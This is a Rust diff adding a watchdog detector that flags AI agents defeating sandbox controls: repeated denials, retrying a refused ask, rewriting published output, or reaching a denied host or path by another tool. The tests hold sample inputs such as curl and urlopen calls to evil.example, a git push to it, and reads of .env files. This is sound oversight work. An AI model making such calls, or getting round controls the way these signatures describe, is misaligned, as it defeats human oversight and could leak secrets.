@@ -2,6 +2,7 @@
 //! the user when nudging doesn't help. The decision is a pure function so it can be tested with a
 //! fixed clock; the loop around it runs once a minute.
 
+use crate::boundary::Boundary;
 use crate::{
     Shared,
     orgs::effective_watchdog,
@@ -10,6 +11,7 @@ use crate::{
 };
 use chrono::{DateTime, Duration, Utc};
 use serde_json::{Value, json};
+use std::collections::{HashMap, VecDeque};
 use std::sync::{Arc, atomic::Ordering};
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -51,6 +53,8 @@ pub struct Activity {
     pub denied_since: Option<DateTime<Utc>>,
     /// The class and hint of the latest denial, so the nudge can name what was denied.
     pub last_denial: Option<(String, String)>,
+    /// The colony's recent `boundary` events, for the control-defeat signature (issue #609).
+    pub boundaries: BoundaryTrail,
 }
 
 /// Consecutive denied tool results that make a hint loop (issue #609): two, so one denial — a
@@ -71,6 +75,7 @@ impl Activity {
             denials: 0,
             denied_since: None,
             last_denial: None,
+            boundaries: BoundaryTrail::default(),
         }
     }
 
@@ -142,6 +147,221 @@ pub fn note_denials(activity: &mut Activity, kind: &str, event: &serde_json::Val
         }
         _ => false,
     }
+}
+
+/// The control-defeat signature's window for repeated denials (issue #609): this many minutes.
+pub const CONTROL_DEFEAT_WINDOW_MINUTES: i64 = 10;
+/// Denials of one control within [`CONTROL_DEFEAT_WINDOW_MINUTES`] that make the repeated-denial
+/// signature: three, so a one-off refusal the agent works around, and a single retry, are not one.
+pub const REPEATED_DENIALS: usize = 3;
+/// How long a refused target is remembered for the deny-then-reach signature, in minutes.
+pub const REACH_WINDOW_MINUTES: i64 = 30;
+/// The most boundary events kept per colony, and the most tool calls held as possibly reaching one.
+const TRAIL_CAP: usize = 64;
+/// The attention reason the control-defeat signature raises.
+pub const CONTROL_DEFEAT_REASON: &str = "control_defeat";
+
+/// A colony's recent `boundary` events (issue #609), with the host time each arrived: what the
+/// control-defeat signature reads. In memory like the rest of `Activity`: a restart forgets the
+/// trail, which at worst lets a pattern that straddles it go unflagged.
+#[derive(Clone, Debug, Default)]
+pub struct BoundaryTrail {
+    recent: VecDeque<(DateTime<Utc>, Boundary)>,
+    /// Tool calls in flight whose input names a refused target, by `tool_call_id`: a successful
+    /// result for one is the deny-then-reach signature.
+    reaching: HashMap<String, Boundary>,
+}
+
+/// A control-defeat signature that fired (issue #609): which pattern, a sentence for a person, and
+/// the boundary events that are its evidence.
+#[derive(Clone, Debug, PartialEq)]
+pub struct Defeat {
+    pub signature: &'static str,
+    pub summary: String,
+    pub evidence: Vec<Boundary>,
+}
+
+impl BoundaryTrail {
+    fn prune(&mut self, now: DateTime<Utc>) {
+        let horizon = now - Duration::minutes(REACH_WINDOW_MINUTES.max(CONTROL_DEFEAT_WINDOW_MINUTES));
+        self.recent.retain(|(seen, _)| *seen >= horizon);
+        while self.recent.len() > TRAIL_CAP {
+            self.recent.pop_front();
+        }
+    }
+
+    /// Drops the events a fired signature used, so the same evidence never flags twice and a new
+    /// flag needs a fresh pattern.
+    fn consume(&mut self, used: &[Boundary]) {
+        self.recent.retain(|(_, b)| !used.contains(b));
+    }
+
+    /// How many boundary events the trail holds (tests and the cockpit's evidence count).
+    pub fn len(&self) -> usize {
+        self.recent.len()
+    }
+}
+
+/// Folds one `boundary` event into the colony's trail and returns the control-defeat signature it
+/// completes, if any (issue #609, docs/boundaries.md "Watchdog signatures"). Pure, with the host's
+/// receive time passed in, so every rule is pinned with a fixed clock:
+///
+/// - **publish_rewrite** — any `publish_rewrite_refused`: publish found colony output crossing its
+///   wall (a rewritten `.git`, a tree that moved after its approval). One is enough.
+/// - **ask_bypass** — any `exec_policy_ask_bypass_attempt`: a rule a person refused asked again.
+/// - **repeated_denial** — [`REPEATED_DENIALS`] denials of the same control (kind and control)
+///   within [`CONTROL_DEFEAT_WINDOW_MINUTES`]: retrying a refused action with trivial variations
+///   matches the same rule each time. One denial, or two, is a wall the colony works around.
+///
+/// A `path_policy_unbound` alone fires nothing — it is the host failing to apply a bind, normal
+/// off Linux — but its target joins the deny-then-reach watch like any other.
+pub fn note_boundary(trail: &mut BoundaryTrail, boundary: Boundary, now: DateTime<Utc>) -> Option<Defeat> {
+    trail.prune(now);
+    trail.recent.push_back((now, boundary.clone()));
+    trail.prune(now);
+    let defeat = match boundary.kind.as_str() {
+        "publish_rewrite_refused" => Some(Defeat {
+            signature: "publish_rewrite",
+            summary: format!("publish refused colony output that crossed its wall ({})", boundary.control),
+            evidence: vec![boundary],
+        }),
+        "exec_policy_ask_bypass_attempt" => {
+            let evidence: Vec<Boundary> = trail
+                .recent
+                .iter()
+                .filter(|(_, b)| b.control == boundary.control)
+                .map(|(_, b)| b.clone())
+                .collect();
+            Some(Defeat {
+                signature: "ask_bypass",
+                summary: format!("the colony retried `{}` after its ask was refused", boundary.control),
+                evidence,
+            })
+        }
+        "path_policy_unbound" => None,
+        _ => {
+            let since = now - Duration::minutes(CONTROL_DEFEAT_WINDOW_MINUTES);
+            let evidence: Vec<Boundary> = trail
+                .recent
+                .iter()
+                .filter(|(seen, b)| *seen >= since && b.kind == boundary.kind && b.control == boundary.control)
+                .map(|(_, b)| b.clone())
+                .collect();
+            (evidence.len() >= REPEATED_DENIALS).then(|| Defeat {
+                signature: "repeated_denial",
+                summary: format!(
+                    "`{}` refused the colony {} times in {CONTROL_DEFEAT_WINDOW_MINUTES} min",
+                    boundary.control,
+                    evidence.len()
+                ),
+                evidence,
+            })
+        }
+    };
+    if let Some(defeat) = &defeat {
+        trail.consume(&defeat.evidence);
+    }
+    defeat
+}
+
+/// Whether a tool call's input names a refused target: a host as a URL's or an address's host
+/// (`://host`, `@host`), a path as a whole path token — `.env` is not `.env.example`.
+pub fn reaches(input: &str, target: &str) -> bool {
+    if target.len() < 3 {
+        return false;
+    }
+    let is_host = !target.contains('/') && !target.starts_with('.') && !target.starts_with('~') && target.contains('.');
+    if is_host {
+        let host = target.to_ascii_lowercase();
+        let text = input.to_ascii_lowercase();
+        return [format!("://{host}"), format!("@{host}")].iter().any(|prefix| {
+            text.match_indices(prefix.as_str()).any(|(at, m)| {
+                let next = text[at + m.len()..].chars().next();
+                !next.is_some_and(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
+            })
+        });
+    }
+    let path_char = |c: char| c.is_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~');
+    input.match_indices(target).any(|(at, m)| {
+        let before = input[..at].chars().next_back();
+        let after = input[at + m.len()..].chars().next();
+        let clean_before = match before {
+            None => true,
+            // `./.env` names `.env`; `config/.env` is another file.
+            Some('/') => input[..at].ends_with("./") && !input[..at].ends_with("../"),
+            Some(c) => !path_char(c),
+        };
+        clean_before && !after.is_some_and(path_char)
+    })
+}
+
+/// A tool call opened (issue #609): when its input names a target a control refused within
+/// [`REACH_WINDOW_MINUTES`], it is held, so its result can tell whether the refused thing was then
+/// reached another way.
+pub fn note_reach_call(trail: &mut BoundaryTrail, tool_call_id: &str, input: &Value, now: DateTime<Utc>) {
+    trail.prune(now);
+    let text = input.to_string();
+    let since = now - Duration::minutes(REACH_WINDOW_MINUTES);
+    let hit = trail
+        .recent
+        .iter()
+        .rev()
+        .find(|(seen, b)| *seen >= since && b.target.as_deref().is_some_and(|target| reaches(&text, target)));
+    if let Some((_, boundary)) = hit
+        && trail.reaching.len() < TRAIL_CAP
+    {
+        trail.reaching.insert(tool_call_id.to_string(), boundary.clone());
+    }
+}
+
+/// A tool call's result (issue #609): the **deny_then_reach** signature fires when a call held by
+/// [`note_reach_call`] succeeded — the egress-denied host reached, the refused write target written
+/// through another tool. An errored result is the wall holding again, not a defeat.
+pub fn note_reach_result(trail: &mut BoundaryTrail, tool_call_id: &str, is_error: bool) -> Option<Defeat> {
+    let boundary = trail.reaching.remove(tool_call_id)?;
+    if is_error {
+        return None;
+    }
+    trail.consume(std::slice::from_ref(&boundary));
+    Some(Defeat {
+        signature: "deny_then_reach",
+        summary: format!(
+            "a tool call ({tool_call_id}) reached `{}` after `{}` refused it ({})",
+            boundary.target.as_deref().unwrap_or_default(),
+            boundary.control,
+            boundary.kind
+        ),
+        evidence: vec![boundary],
+    })
+}
+
+/// Raises the control-defeat flag on a colony (issue #609): the attention item carries the
+/// signature, a sentence and the boundary events that are its evidence, and the log says why. Not a
+/// stop: a signature is a pattern, not proof, so a person decides (docs/boundaries.md). A colony
+/// already flagged for control-defeat keeps its first evidence and gets a log line only.
+pub(crate) async fn flag_control_defeat(app: &Shared, id: &str, defeat: Defeat) {
+    let Some(s) = app.session(id).await else { return };
+    let message = format!(
+        "watchdog: control-defeat signature ({}): {}; this colony needs you",
+        defeat.signature, defeat.summary
+    );
+    let already = s.attention.as_ref().and_then(|a| a["reason"].as_str()) == Some(CONTROL_DEFEAT_REASON);
+    if !already {
+        let evidence: Vec<Value> = defeat.evidence.iter().map(Boundary::to_event).collect();
+        let since = Utc::now();
+        app.update_session(id, |x| {
+            x.attention = Some(json!({
+                "reason": CONTROL_DEFEAT_REASON,
+                "since": since,
+                "nudges": 0,
+                "signature": defeat.signature,
+                "detail": defeat.summary,
+                "evidence": evidence,
+            }));
+        })
+        .await;
+    }
+    app.session_log_as(Origin::Watchdog, id, "error", message).await;
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -419,6 +639,11 @@ async fn check_all(app: &Shared) {
             _ => Observed::Other,
         };
         let attention = s.attention.as_ref().and_then(|a| a["reason"].as_str()).map(String::from);
+        // A control-defeat flag (issue #609) is a person's to look at: the watchdog neither nudges
+        // over it nor replaces it with a stall flag, and gateway traffic does not lift it.
+        if attention.as_deref() == Some(CONTROL_DEFEAT_REASON) {
+            continue;
+        }
         // A request waiting on a slow model through the gateway is progress, not a stall.
         if app.gateway.colony_busy(&s.id) {
             rt.activity.lock().await.note_gateway_busy(now);
@@ -632,6 +857,7 @@ mod tests {
             denials: 0,
             denied_since: None,
             last_denial: None,
+            boundaries: BoundaryTrail::default(),
         };
         assert_eq!(
             decide(&SETTINGS, at(34), Observed::Working, &activity, None),
@@ -654,6 +880,7 @@ mod tests {
             denials: 0,
             denied_since: None,
             last_denial: None,
+            boundaries: BoundaryTrail::default(),
         };
         assert_eq!(
             decide(&SETTINGS, at(29), Observed::WaitingForAnswer, &activity, None),
@@ -940,7 +1167,7 @@ mod tests {
         check_all(&app).await;
 
         assert!(rt.final_text_at.lock().await.is_none(), "the claim is spent");
-        let events = std::fs::read_to_string(&rt.events_path).unwrap();
+        let events = std::fs::read_to_string(app.session_dir("w1").join("events.jsonl")).unwrap();
         assert!(
             events.contains(r#""type":"watchdog_turn_end""#),
             "the end is on the record: {events}"
@@ -974,7 +1201,7 @@ mod tests {
             "not finished while a call is in flight"
         );
         assert!(
-            !std::fs::read_to_string(&rt.events_path)
+            !std::fs::read_to_string(app.session_dir("w1").join("events.jsonl"))
                 .unwrap_or_default()
                 .contains("watchdog_turn_end")
         );
@@ -1045,7 +1272,7 @@ mod tests {
             "the claim is kept: the runner started working during the probe"
         );
         assert!(
-            !std::fs::read_to_string(&rt.events_path)
+            !std::fs::read_to_string(app.session_dir("w1").join("events.jsonl"))
                 .unwrap_or_default()
                 .contains("watchdog_turn_end"),
             "no end is synthesised for a busy runner"
@@ -1101,6 +1328,7 @@ mod tests {
             denials: 2,
             denied_since: Some(at(0)),
             last_denial: Some(("egress".to_string(), "denied host example.com".to_string())),
+            boundaries: BoundaryTrail::default(),
         };
         assert_eq!(
             decide(&SETTINGS, at(14), Observed::Working, &activity, None),
@@ -1125,6 +1353,7 @@ mod tests {
             denials: 1,
             denied_since: Some(at(0)),
             last_denial: Some(("read_only".to_string(), "path is read-only".to_string())),
+            boundaries: BoundaryTrail::default(),
         };
         assert_eq!(decide(&SETTINGS, at(24), Observed::Working, &one, None), Decision::Nothing);
         assert_eq!(decide(&SETTINGS, at(25), Observed::Working, &one, None), Decision::Nudge);
@@ -1172,6 +1401,7 @@ mod tests {
             denials: 3,
             denied_since: Some(at(0)),
             last_denial: Some(("tool_disabled".to_string(), "tool is not allowed".to_string())),
+            boundaries: BoundaryTrail::default(),
         };
         assert_eq!(
             decide(&SETTINGS, at(44), Observed::Working, &activity, Some("stalled")),
@@ -1264,6 +1494,7 @@ mod tests {
             denials: 3,
             denied_since: Some(at(0)),
             last_denial: Some(("egress".to_string(), "denied host example.com".to_string())),
+            boundaries: BoundaryTrail::default(),
         };
         // Without a busy tick the loop would nudge at 15.
         assert_eq!(decide(&SETTINGS, at(15), Observed::Working, &activity, None), Decision::Nudge);
@@ -1276,5 +1507,195 @@ mod tests {
             Decision::Nothing
         );
         assert_eq!(decide(&SETTINGS, at(29), Observed::Working, &activity, None), Decision::Nudge);
+    }
+
+    // ---- Control-defeat signature (issue #609) ----
+
+    fn denial(kind: &str, control: &str, target: Option<&str>) -> Boundary {
+        Boundary {
+            kind: kind.into(),
+            control: control.into(),
+            detail: format!("{kind} by {control}"),
+            target: target.map(String::from),
+            at: "2026-01-01T00:00:00.000Z".into(),
+        }
+    }
+
+    #[test]
+    fn a_single_benign_deny_and_a_retry_are_not_a_defeat() {
+        let mut trail = BoundaryTrail::default();
+        let deny = denial("exec_policy_deny", "exec_policy:secret-paths", Some(".env"));
+        assert_eq!(note_boundary(&mut trail, deny.clone(), at(0)), None, "one denial is a wall");
+        assert_eq!(note_boundary(&mut trail, deny, at(1)), None, "a single retry is still a wall");
+        assert_eq!(
+            note_boundary(&mut trail, denial("egress_denied", "egress", Some("x.example")), at(2)),
+            None,
+            "a different control does not add up"
+        );
+        assert_eq!(
+            note_boundary(
+                &mut trail,
+                denial("path_policy_unbound", "path_policy:masked", Some("v/.env")),
+                at(3)
+            ),
+            None,
+            "an unbound path alone is the host's fault, not the colony's"
+        );
+    }
+
+    #[test]
+    fn repeated_denials_of_one_control_within_the_window_fire_with_their_evidence() {
+        let mut trail = BoundaryTrail::default();
+        let deny = |cmd: &str| Boundary {
+            detail: format!("deny (default): cat {cmd}"),
+            ..denial("exec_policy_deny", "exec_policy:secret-paths", Some(cmd))
+        };
+        assert_eq!(note_boundary(&mut trail, deny(".env"), at(0)), None);
+        assert_eq!(note_boundary(&mut trail, deny("./.env"), at(4)), None);
+        let defeat = note_boundary(&mut trail, deny(".env.local"), at(9)).expect("the third in 10 min fires");
+        assert_eq!(defeat.signature, "repeated_denial");
+        assert_eq!(defeat.evidence.len(), REPEATED_DENIALS);
+        assert!(defeat.summary.contains("exec_policy:secret-paths"), "{}", defeat.summary);
+        assert_eq!(
+            note_boundary(&mut trail, deny(".envrc"), at(9)),
+            None,
+            "the evidence is spent: the next flag needs a fresh pattern"
+        );
+
+        // Spread past the window, three denials are not a pattern.
+        let mut slow = BoundaryTrail::default();
+        assert_eq!(note_boundary(&mut slow, deny(".env"), at(0)), None);
+        assert_eq!(note_boundary(&mut slow, deny(".env"), at(6)), None);
+        assert_eq!(
+            note_boundary(&mut slow, deny(".env"), at(12)),
+            None,
+            "the first fell out of the window"
+        );
+    }
+
+    #[test]
+    fn an_ask_bypass_attempt_and_a_publish_rewrite_fire_at_once() {
+        let mut trail = BoundaryTrail::default();
+        note_boundary(
+            &mut trail,
+            denial("exec_policy_deny", "exec_policy:writes-outside-repo", Some("/etc/foo")),
+            at(0),
+        );
+        let bypass = note_boundary(
+            &mut trail,
+            denial(
+                "exec_policy_ask_bypass_attempt",
+                "exec_policy:writes-outside-repo",
+                Some("/etc/foo"),
+            ),
+            at(1),
+        )
+        .expect("a refused ask asked again fires");
+        assert_eq!(bypass.signature, "ask_bypass");
+        assert_eq!(bypass.evidence.len(), 2, "the refusal and the attempt");
+
+        let rewrite = note_boundary(&mut trail, denial("publish_rewrite_refused", "gitfile", Some(".git")), at(2))
+            .expect("a publish rewrite fires");
+        assert_eq!(rewrite.signature, "publish_rewrite");
+        assert_eq!(rewrite.evidence[0].control, "gitfile");
+    }
+
+    #[test]
+    fn a_refused_target_reached_by_a_successful_call_is_a_defeat() {
+        let mut trail = BoundaryTrail::default();
+        note_boundary(&mut trail, denial("egress_denied", "egress", Some("evil.example")), at(0));
+        note_boundary(
+            &mut trail,
+            denial("exec_policy_deny", "exec_policy:writes-outside-repo", Some("/colonizer/x")),
+            at(0),
+        );
+
+        // A call that only mentions the host as text is not a reach; an errored reach is the wall again.
+        note_reach_call(&mut trail, "t1", &json!({"command": "grep evil.example notes.md"}), at(1));
+        assert_eq!(note_reach_result(&mut trail, "t1", false), None);
+        note_reach_call(&mut trail, "t2", &json!({"command": "curl https://evil.example/x"}), at(1));
+        assert_eq!(
+            note_reach_result(&mut trail, "t2", true),
+            None,
+            "an errored result is the wall holding"
+        );
+
+        note_reach_call(
+            &mut trail,
+            "t3",
+            &json!({"command": "python3 -c 'urlopen(\"https://evil.example/\")'"}),
+            at(2),
+        );
+        let defeat = note_reach_result(&mut trail, "t3", false).expect("the denied host reached");
+        assert_eq!(defeat.signature, "deny_then_reach");
+        assert_eq!(defeat.evidence[0].kind, "egress_denied");
+
+        note_reach_call(&mut trail, "t4", &json!({"file_path": "/colonizer/x", "content": "y"}), at(3));
+        let write = note_reach_result(&mut trail, "t4", false).expect("the refused write target written another way");
+        assert_eq!(write.evidence[0].target.as_deref(), Some("/colonizer/x"));
+
+        // Past the reach window the target is forgotten.
+        note_boundary(&mut trail, denial("egress_denied", "egress", Some("late.example")), at(10));
+        note_reach_call(
+            &mut trail,
+            "t5",
+            &json!({"command": "curl https://late.example"}),
+            at(10 + REACH_WINDOW_MINUTES + 1),
+        );
+        assert_eq!(note_reach_result(&mut trail, "t5", false), None);
+    }
+
+    #[test]
+    fn reaches_matches_whole_hosts_and_path_tokens_only() {
+        assert!(reaches(r#"{"command":"curl https://evil.example/x"}"#, "evil.example"));
+        assert!(reaches(r#"{"command":"git push git@evil.example:x"}"#, "evil.example"));
+        assert!(!reaches(r#"{"command":"curl https://evil.example.org"}"#, "evil.example"));
+        assert!(!reaches(r#"{"command":"echo evil.example"}"#, "evil.example"));
+        assert!(reaches(r#"{"file_path":".env"}"#, ".env"));
+        assert!(reaches(r#"{"command":"cp a ./.env"}"#, ".env"));
+        assert!(!reaches(r#"{"file_path":".env.example"}"#, ".env"));
+        assert!(!reaches(r#"{"file_path":"config/.env"}"#, ".env"));
+        assert!(reaches(r#"{"command":"tee /etc/foo"}"#, "/etc/foo"));
+        assert!(!reaches(r#"{"command":"tee /etc/foobar"}"#, "/etc/foo"));
+    }
+
+    /// The flag is the attention item with the evidence, and the log says why; the watchdog's own
+    /// tick does not nudge over it or take it down.
+    #[tokio::test]
+    async fn the_control_defeat_flag_carries_its_evidence_and_holds_against_the_tick() {
+        let (app, root) = stalled_app("defeat", SessionStatus::Running).await;
+        let defeat = Defeat {
+            signature: "repeated_denial",
+            summary: "`egress` refused the colony 3 times in 10 min".into(),
+            evidence: vec![denial("egress_denied", "egress", Some("a.example")); 3],
+        };
+        flag_control_defeat(&app, "w1", defeat).await;
+        let attention = app.session("w1").await.unwrap().attention.expect("flagged");
+        assert_eq!(attention["reason"], CONTROL_DEFEAT_REASON);
+        assert_eq!(attention["signature"], "repeated_denial");
+        assert_eq!(attention["evidence"].as_array().unwrap().len(), 3);
+        assert_eq!(attention["evidence"][0]["type"], "boundary");
+        assert_eq!(attention["evidence"][0]["target"], "a.example");
+        check_all(&app).await;
+        assert_eq!(
+            app.session("w1").await.unwrap().attention.unwrap()["reason"],
+            CONTROL_DEFEAT_REASON,
+            "a stalled colony's tick does not replace the flag"
+        );
+        let logs = app.runtime("w1").await.logs.lock().await.clone();
+        assert!(
+            logs.iter().any(|l| l["level"] == "error"
+                && l["message"]
+                    .as_str()
+                    .is_some_and(|m| m.contains("control-defeat signature (repeated_denial)"))),
+            "{logs:?}"
+        );
+        assert!(
+            !logs
+                .iter()
+                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("nudged the agent"))),
+            "and no nudge was sent over it"
+        );
+        let _ = std::fs::remove_dir_all(root);
     }
 }
